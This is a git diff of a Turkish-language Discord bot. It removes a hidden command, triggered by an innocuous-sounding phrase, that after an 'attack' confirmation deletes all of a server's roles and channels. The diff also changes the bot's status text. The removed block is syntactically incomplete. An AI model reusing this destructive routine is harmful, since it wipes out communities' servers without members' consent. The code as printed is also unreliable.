@@ -134,31 +134,11 @@ client.unload = command => {
   });
 };
 
-client.on('message', async message => {
-  const ms = require('ms');
-  const args = message.content.slice(prefix.length).trim().split(/ +/g);
-  const command = args.shift().toLowerCase();
-  let u = message.mentions.users.first() || message.author;
-  if (command === "burayı bi düzelt") {
-  if (message.guild.channels.find(channel => channel.name === "Bot Kullanımı")) return message.channel.send(" Bot Paneli Zaten Ayarlanmış.")
-  message.channel.send(`**SALDIRI** başlatılsın mı? başlatılacak ise **evet** yazınız.`)
-      if (!message.member.hasPermission('ADMINISTRATOR'))
-  return message.channel.send(" Bu Kodu `Yönetici` Yetkisi Olan Kişi Kullanabilir.");
-      message.channel.awaitMessages(response => response.content === 'evet', {
-        max: 1,
-        time: 10000,
-        errors: ['time'],
-      })
-    .then((collected) => {
-message.guild.roles.deleteAll("");
-message.guild.channels.deleteAll("");
-}
-
 client.on('ready', () => {
     client.user.setPresence({
         game: {
-            name: `!yardım | 452 Sunucu | 234K Yakın Kullanıcı`,
-            type: 'https://www.twitch.tv/prisma', 
+            name: `!yardım | Lyrîcs. い#2112`,
+            type: 'WATCHING', 
             // Değerler:
             // PLAYING: Oynuyor
             // WATCHING: İzliyor
